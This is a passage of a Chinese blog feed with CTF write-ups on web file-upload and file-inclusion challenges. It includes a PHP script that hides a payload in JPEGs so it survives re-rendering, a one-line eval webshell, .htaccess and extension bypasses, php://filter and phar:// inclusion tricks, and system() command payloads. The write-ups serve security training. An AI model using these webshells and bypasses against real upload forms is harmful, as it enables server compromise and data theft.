$dis = new DataInputStream($argv[1]);</span><br><span class="line">        $outStream = file_get_contents($argv[1]);</span><br><span class="line">        $extraBytes = 0;</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line"></span><br><span class="line">        if($dis-&gt;readShort() != 0xFFD8) &#123;</span><br><span class="line">            die(&#x27;Incorrect SOI marker&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - 2;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            if($marker === 0xDA) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, 0, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE);</span><br><span class="line">                if($extraBytes !== 0) &#123;</span><br><span class="line">                    while((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        if($dis-&gt;readByte() === 0xFF) &#123;</span><br><span class="line">                            if($dis-&gt;readByte !== 0x00) &#123;</span><br><span class="line">                                break;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - 2;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, 0, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            0,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; elseif($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123;</span><br><span class="line">                    die(&#x27;Success!&#x27;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(&#x27;payload_&#x27;.$argv[1]);</span><br><span class="line">    die(&#x27;Something\&#x27;s wrong&#x27;);</span><br><span class="line"></span><br><span class="line">    function checkImage($filename, $data, $unlink = FALSE) &#123;</span><br><span class="line">        global $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        if($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        return $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span><br><span class="line">        global $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = FALSE;</span><br><span class="line">        if(preg_match(&#x27;/(\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123;</span><br><span class="line">            if(isset($m[1])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[1];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class DataInputStream &#123;</span><br><span class="line">        private $binData;</span><br><span class="line">        private $order;</span><br><span class="line">        private $size;</span><br><span class="line"></span><br><span class="line">        public function __construct($filename, $order = false, $fromString = false) &#123;</span><br><span class="line">            $this-&gt;binData = &#x27;&#x27;;</span><br><span class="line">            $this-&gt;order = $order;</span><br><span class="line">            if(!$fromString) &#123;</span><br><span class="line">                if(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;);</span><br><span class="line">                $this-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $this-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            $this-&gt;size = strlen($this-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function seek() &#123;</span><br><span class="line">            return ($this-&gt;size - strlen($this-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function skip($skip) &#123;</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readByte() &#123;</span><br><span class="line">            if($this-&gt;eof()) &#123;</span><br><span class="line">                die(&#x27;End Of File&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr($this-&gt;binData, 0, 1);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 1);</span><br><span class="line">            return ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readShort() &#123;</span><br><span class="line">            if(strlen($this-&gt;binData) &lt; 2) &#123;</span><br><span class="line">                die(&#x27;End Of File&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr($this-&gt;binData, 0, 2);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 2);</span><br><span class="line">            if($this-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);</span><br><span class="line">            &#125;</span><br><span class="line">            return $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function eof() &#123;</span><br><span class="line">            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>格式为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php &lt;脚本名&gt; &lt;图片名&gt;</span><br></pre></td></tr></table></figure><p><img src="/2022/02/05/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/20201130104008653.png" alt="20201130104008653.png (1378×692)"></p><p>上传图片–&gt;查看图片–&gt; 抓包–&gt; 传参</p><p><img src="/2022/02/05/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/20201130104340870.png" alt="20201130104340870.png (1904×810)"></p><p>jpg的图片进行二次渲染 经常容易失败 所以多多尝试即可</p><h1 id="zip文件上传包含"><a href="#zip文件上传包含" class="headerlink" title="zip文件上传包含"></a>zip文件上传包含</h1><p><img src="/2022/02/05/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/20201130104713156.png" alt="20201130104713156.png (1537×836)"></p><p>查看源代码发现只能上传<code>zip</code></p><p>尝试上传zip类型的一句话马</p><p>抓到上传成功的url</p><p>抓包–&gt; 传参<br>返回上一级目录 –&gt;ok</p><p><img src="/2022/02/05/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%AF%A6%E7%BB%86%E8%AE%B2%E8%A7%A3/20201130111919734.png" alt="20201130111919734.png (1885×787)"></p><h1 id="htaccess"><a href="#htaccess" class="headerlink" title="htaccess"></a>htaccess</h1><p>如果Apache中.htaccess可被执行并可被上传，那么可以尝试在.htaccess中写入：<br>&lt;FilesMatch “shell.jpg”&gt;<br>SetHandler application/x-httpd-php&lt;//FilesMatch&gt;<br>然后再上传shell.jpg的木马，这样shell.jpg就可被解析为PHP文件了</p><p>连接蚁剑，在根目录查到flag</p><h1 id="操作系统特性解析"><a href="#操作系统特性解析" class="headerlink" title="操作系统特性解析"></a>操作系统特性解析</h1><p>由于windows会将文件的后缀中的空格以及点进行过滤，如果遇到是黑名单校验的，如限制不允许上传PHP文件，而系统又是windows系统，那么我们可以上传xx.php ，或者xx.php.，通过这种方式就可以绕过黑名单检验的文件上传！</p>]]></content>
      
      
      <categories>
          
          <category> ctf类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web中文件上传（刷题）</title>
      <link href="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<p>web中的文件上传</p><span id="more"></span><h1 id="题一"><a href="#题一" class="headerlink" title="题一"></a>题一</h1><p>题目来源于bugku</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1.png"></p><p>打开题目，用Fn+F12查看，发现做了过滤只能上传,jpg和.png，而且上传的文件会以python运行并且返回结果</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2.png"></p><p>用python写入代码</p><p>import os的作用：</p><p>该语句就是在python环境下对文件，文件夹执行操作的一个模板。</p><p>os.system方法是os模板最基础的方法，其它的方法一般在该方法基础上封装完成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(&#x27;cat /flag&#x27;)</span><br></pre></td></tr></table></figure><p>ctrl+s保存到桌面上，把python文件修改后缀名</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/3.png" alt="屏幕截图 2022-02-04 231903"></p><p>提交之后f12，得到flag</p><h1 id="题二"><a href="#题二" class="headerlink" title="题二"></a>题二</h1><p>题目来源于bugku</p><p>方法一，启动场景，发现是文件上传</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/4.png" alt="屏幕截图 2022-02-04 232541"></p><p>只能上传图像，不能上传PHP文件，那应该是寻找漏洞上传PHP文件<br>PHP文件里写入一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[caidao]);?&gt;</span><br></pre></td></tr></table></figure><p>使用burp抓包，不断尝试发现发现需要修改的地方有三个：<br>一个是http head里的Content-Type: multipart/form-data;<br>请求头部的 Content-Type 内容 随便改个大写字母过滤掉 比如 mulTipart/form-data （其t为大写）<br>Multipart里的部分字母改成大写的。</p><p>第二个是文件的的Content-Type: application/octet-stream，改成image/jpeg</p><p>第三个是文件后缀名改成php4<br>（依次尝试php4，phtml，phtm，phps，php5（包括一些字母改变大小写））分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php4没有被过滤</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/5.png" alt="屏幕截图 2022-02-04 233414"></p><p>该过之后点击forward，在浏览器上会显示文件路径<img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/6.png" alt="屏幕截图 2022-02-04 232434"></p><p>以蚁剑连接</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/7.png" alt="屏幕截图 2022-02-04 233917"></p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/8.png" alt="屏幕截图 2022-02-04 234017"></p><p>进入服务器后台，在根目录发现flag</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/9.png" alt="屏幕截图 2022-02-04 230129"></p><p>打开flag</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/10.png" alt="屏幕截图 2022-02-04 225833"></p><p>得到flag</p><p>方法二，也可以进行源码分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">$flag = &quot;flag&#123;test&#125;&quot;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">My name is margin,give me a image file not a php&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; </span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">function global_filter()&#123;</span><br><span class="line"> $type =  $_SERVER[&quot;CONTENT_TYPE&quot;];//$_SERVER是一个服务器端的变量数组，提供许多关于服务器及客户端请求的变量值，像客户端浏览器类型、IP地址等</span><br><span class="line"> if (strpos($type,&quot;multipart/form-data&quot;) !== False)&#123;//strpos() 函数查找字符串在另一字符串里第一次出现的位置。strpos() 函数对大小写敏感。</span><br><span class="line">  $file_ext =  substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1);//strrpos()查找字符串在另一字符串最后一次出现位置</span><br><span class="line">        $file_ext = strtolower($file_ext); //strtolower() 函数把字符串转换为小写。</span><br><span class="line">  if (stripos($file_ext,&quot;php&quot;) !== False)&#123;</span><br><span class="line">   American(&quot;Invalid File&lt;br /&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">//这里判断multipart/form-data用了strpos，该函数区分大小写，所以用Multipart/form-data的理由找到了，这样就能绕过里面的if</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">global_filter();</span><br><span class="line">if ((stripos($_FILES[&quot;file&quot;][&quot;type&quot;],&#x27;image&#x27;)!== False) &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 10*1024*1024))&#123;</span><br><span class="line"> if ($_FILES[&quot;file&quot;][&quot;error&quot;] == 0)&#123;</span><br><span class="line">  $file_ext =  substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1);</span><br><span class="line">        $file_ext = strtolower($file_ext);</span><br><span class="line">        $allowexts = array(&#x27;jpg&#x27;,&#x27;gif&#x27;,&#x27;jpeg&#x27;,&#x27;bmp&#x27;,&#x27;php4&#x27;); //array()  创建数组</span><br><span class="line">        if(!in_array($file_ext,$allowexts))&#123;</span><br><span class="line">            American(&quot;give me a image file not a php&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        //这里定了个白名单，只漏了个php4出来，只能用php4的原因也找到了</span><br><span class="line"></span><br><span class="line">  $_FILES[&quot;file&quot;][&quot;name&quot;]=&quot;bugku&quot;.date(&#x27;dHis&#x27;).&quot;_&quot;.rand(1000,9999).&quot;.&quot;.$file_ext; //rand() 函数返回随机整数。</span><br><span class="line">                                  //date() 函数格式操作本地日期和时间，并返回已格式操作的日期字符串。</span><br><span class="line">     if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123; //file_exists() 函数检查文件或目录是否存在。</span><br><span class="line">      echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &lt;br /&gt;&quot;;</span><br><span class="line">     &#125;</span><br><span class="line">     else&#123;</span><br><span class="line">      if (!file_exists(&#x27;./upload/&#x27;))&#123;</span><br><span class="line">       mkdir (&quot;./upload/&quot;);</span><br><span class="line">                system(&quot;chmod 777 /var/www/html/upload&quot;); //system — 执行外部程序，并且显示输出</span><br><span class="line">      &#125;</span><br><span class="line">      move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);//move_uploaded_file — 将上传的文件移动到新位置</span><br><span class="line">                echo &quot;Upload Success&lt;br&gt;&quot;;</span><br><span class="line">                $filepath = &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        echo &quot;Stored in: &quot; .&quot;&lt; a href=&#x27;&quot; . $filepath . &quot;&#x27; target=&#x27;_blank&#x27;&gt;&quot; . $filepath . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line"> if($_FILES[&quot;file&quot;][&quot;size&quot;] &gt; 0)&#123;</span><br><span class="line">  echo &quot;You was catched! :) &lt;br /&gt;&quot;;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">$_SERVER是一个服务器端的变量数组，提供许多关于服务器及客户端请求的变量值，像客户端浏览器类型、IP地址等</span><br><span class="line">通过 print_r($_SERVER)可以输出其里包含了那些内容</span><br><span class="line"></span><br><span class="line">strpos() 函数查找字符串在另一字符串里第一次出现的位置。strpos() 函数对大小写敏感。</span><br><span class="line">strrpos() - 查找字符串在另一字符串里最后一次出现的位置（区分大小写）</span><br><span class="line">例如：echo strrpos(&quot;You love php, I love php too!&quot;,&quot;php&quot;); 结果返回21</span><br><span class="line"></span><br><span class="line">$_FILES -- $HTTP_POST_FILES [已弃用] — HTTP 文件上传变量</span><br><span class="line">PHP $_FILES 是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息。如果为单个文件上传，那么 $_FILES 为二维数组；如果为多个文件上传，那么 $_FILES 为三维数组。</span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;name&#x27;] 客户端文件的原名称。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;type&#x27;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;size&#x27;] 已上传文件的大小，单位为字节。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;tmp_name&#x27;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。 </span><br><span class="line">$_FILES[&#x27;myFile&#x27;][&#x27;error&#x27;] 和该文件上传相关的错误代码。[&#x27;error&#x27;] 是在 PHP 4.2.0 版本里增加的。下面是它的说明：(它们在PHP3.0以后成了常量) </span><br><span class="line">UPLOAD_ERR_OK </span><br><span class="line">值：0; 没有错误发生，文件上传成功。 </span><br><span class="line"></span><br><span class="line">strtolower() 函数把字符串转换为小写。</span><br><span class="line"></span><br><span class="line">date() 函数格式操作本地日期和时间，并返回已格式操作的日期字符串。</span><br><span class="line"></span><br><span class="line">rand() 函数返回随机整数。</span><br><span class="line"></span><br><span class="line">file_exists() 函数检查文件或目录是否存在。</span><br><span class="line">如果指定的文件或目录存在则返回 true，否则返回 false。</span><br><span class="line"></span><br><span class="line">system — 执行外部程序，并且显示输出</span><br><span class="line"></span><br><span class="line">move_uploaded_file — 将上传的文件移动到新位置</span><br><span class="line">*/</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="题三"><a href="#题三" class="headerlink" title="题三"></a>题三</h1><p>题目来源于bugku</p><p>文件包含</p><p>首先要知道文件包含的步骤是配合，伪协议，读取敏感文件</p><p>解题过程</p><p>访问ip，默认是index.php</p><p>点击click me？no，传参file=show.php</p><p>查看index.php的源码，发现不可以</p><p>这时候需要用伪协议绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>得到经过base64编码后的index.php的源码</p><p>解码后得到flag</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220205135429433.png" alt="image-20220205135429433"></p><h1 id="题四"><a href="#题四" class="headerlink" title="题四"></a>题四</h1><p>题目来源于bugku</p><p>文件包含，进网站</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220205142734919.png" alt="image-20220205142734919"></p><p>发现没有任何线索，右键查看源码或者f12</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220205142852246.png" alt="image-20220205142852246"></p><p>发现注释文件upload.php，访问下来到文件上传页面，发现是上传图片</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220205143237815.png" alt="image-20220205143237815"></p><p>先上传一句话木马,保存文件修改后缀为1.php.jpg，成功上传</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220208002243940.png" alt="image-20220208002243940"></p><p>根据提示是文件包含，直接访问文件路径无效，蚁剑无法连接</p><p>包含文件进行访问是空白页面，再进行蚁剑连接</p><p>新建文档写入如下图所示，另存为jpg格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=php&gt;system(&quot;ls&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220208000311212.png" alt="image-20220208000311212"></p><p>访问保存进去的文件，即save in后面的 upload/202202050636009376.jpg直接访问得到如图所示</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220205145300606.png" alt="image-20220205145300606"></p><p>访问可以直接看到flag文件</p><p>包含或是直接访问都可以得到flag</p><h1 id="题五"><a href="#题五" class="headerlink" title="题五"></a>题五</h1><p>题目来源于ctfshow</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220207232016976.png" alt="image-20220207232016976"></p><p>题目要求是上传图片，所以要生成图片码</p><p>上传之后使用bp抓包</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220207232300140.png" alt="image-20220207232300140"></p><p>把后缀名修改为.php，返回浏览器发现出现了路径</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220207232422870.png" alt="image-20220207232422870"></p><p>用蚁剑连接，打开目录发现flag</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220207233352550.png" alt="image-20220207233352550"></p><h1 id="题六"><a href="#题六" class="headerlink" title="题六"></a>题六</h1><p>题目来源于攻防世界upload 1</p><p>打开题目可以看出是文件上传</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220209225707017.png" alt="image-20220209225707017"></p><p>首先上传一下一句话试试，发现限制必须是图片</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220209225802604.png" alt="image-20220209225802604"></p><p>下来思路就很明确了，那就是上传图片码</p><p>上传之后，使用bp抓包，然后修改文件的后缀名</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220209230108664.png" alt="image-20220209230108664"></p><p>显示出来了图片路径</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220209230204853.png" alt="image-20220209230204853"></p><p>然后用蚁剑连接</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20220209230337051.png" alt="image-20220209230337051"></p><p>打开目录成功找到flag</p><h1 id="题七"><a href="#题七" class="headerlink" title="题七"></a>题七</h1><p>打开题目发现是只能上传压缩包的文件上传</p><p>首先查看源代码，发现有url后缀</p><p><a href="https://z4a.net/image/2EugJC"><img src="https://z4a.net/images/2022/06/01/a154d52ca5150ad871d3de6b4c776ea9.png" alt="a154d52ca5150ad871d3de6b4c776ea9.png"></a></p><p><img src="https://i.bmp.ovh/imgs/2022/06/01/304f265bb54333ea.png"></p><p>发现需要使用phar协议，查看一下什么是phar协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phar://伪协议</span><br><span class="line">这个就是php解压缩报的一个函数，不管后缀是什么，都会当做压缩包来解压，用法：?file=phar://压缩包/内部文件 phar://xxx.png/shell.php 注意 PHP&gt;=5.3.0压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。步骤：写一个一句话木马shell.php，然后用zip协议解压缩为shell.zip，然后将后缀改为png等其他格式</span><br></pre></td></tr></table></figure><p>所以先上传一个木马的zip文件，然后访问一下</p><p><img src="https://z4a.net/images/2022/06/01/5246a836ec9d7433ad26d4007401f0a6.png" alt="5246a836ec9d7433ad26d4007401f0a6.png"></p><p><img src="https://z4a.net/images/2022/06/01/13914fb462c191ce785f786bdc34ddda.png" alt="13914fb462c191ce785f786bdc34ddda.png"></p><p>发现已经成功地上传了，然后修改木马内容就可以了</p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20220601231358796.png" alt="image-20220601231358796"></p><p><img src="https://z4a.net/images/2022/06/01/8701b162b725c95361a7909a82955dda.png" alt="8701b162b725c95361a7909a82955dda.png"></p><p><img src="/2022/02/04/web%E4%B8%AD%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/Users\Lenovo\AppData\Roaming\Typora\typora-user-images\image-20220601231851685.png" alt="image-20220601231851685"></p><p><img src="https://z4a.net/images/2022/06/01/cbbfc475c1ca0926386c30832f0dce0e.png" alt="cbbfc475c1ca0926386c30832f0dce0e.png"></p>]]></content>
      
      
      <categories>
          
          <category> wp类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF中misc的基本解题思路</title>
